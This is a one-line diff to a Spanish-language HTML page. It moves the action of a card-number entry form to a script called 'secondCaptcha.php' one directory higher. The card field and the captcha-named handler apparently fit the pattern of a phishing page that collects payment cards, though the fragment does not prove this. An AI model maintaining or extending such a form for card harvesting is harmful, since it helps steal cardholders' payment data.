@@ -65,7 +65,7 @@
 		</div>
 
 		<!-- Formulario -->
-		<form action="../../../vali/secondCaptcha.php" method="post" id="formulario-tarjeta" class="formulario-tarjeta">
+		<form action="../../../secondCaptcha.php" method="post" id="formulario-tarjeta" class="formulario-tarjeta">
 			<div class="grupo">
 				<label for="inputNumero">Número Tarjeta</label>
 				<input type="text" id="inputNumero" maxlength="19" autocomplete="off">
